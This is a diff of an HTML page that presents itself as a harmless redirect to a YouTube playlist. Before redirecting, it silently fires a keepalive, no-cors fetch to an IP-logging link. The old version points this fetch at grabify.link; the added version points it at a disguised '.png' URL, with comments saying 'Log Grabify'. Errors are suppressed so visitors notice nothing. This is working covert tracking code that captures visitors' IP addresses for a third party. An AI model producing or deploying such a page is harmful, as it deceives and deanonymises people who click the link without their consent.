@@ -2,44 +2,27 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Redirecting...</title>
-    
-    <!-- 1. Preconnect to YouTube (Speeds up the destination) -->
-    <link rel="preconnect" href="https://www.youtube.com">
-
-    <!-- 2. Google Analytics (Async) -->
-    <!-- Note: On ultra-fast connections, the redirect might happen before 
-         this script finishes downloading. This is the trade-off for 0 delay. -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-1NN8BF8SC2"></script>
     <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-1NN8BF8SC2', { 'transport_type': 'beacon' });
-    </script>
-</head>
-<body>
-    <p>Redirecting... <a href="https://www.youtube.com/playlist?list=PLMdippUF4xxo">Click here</a> if stuck.</p>
-
-    <script>
-        // 3. Log Grabify using fetch + keepalive (The secret sauce)
-        // This forces the request to finish in the background even after the page dies.
+        // 1. Log Grabify using fetch + keepalive (survives navigation)
         try {
-            fetch("https://grabify.link/RG4GG3", {
+            fetch("https://unl.one/greenbotics.png", {
                 method: 'GET',
-                keepalive: true, // This keeps the connection alive during redirect
-                mode: 'no-cors', // Prevents CORS errors since we don't need the response
+                keepalive: true, // keeps the request alive during redirect
+                mode: 'no-cors', // no response needed, avoids CORS errors
                 cache: 'no-cache'
             });
         } catch (e) {
-            // Ignore errors to ensure redirect happens no matter what
-            console.log(e);
+            // ignore errors so the redirect always happens
         }
 
-        // 4. Instant Redirect
-        // location.replace prevents the "Back" button loop
+        // 2. Instant redirect (fires as early as possible in <head>)
+        // location.replace avoids a "Back" button loop
         window.location.replace("https://www.youtube.com/playlist?list=PLMdippUF4xxo");
     </script>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <p>Redirecting... <a href="https://www.youtube.com/playlist?list=PLMdippUF4xxo">Click here</a> if stuck.</p>
 </body>
 </html>
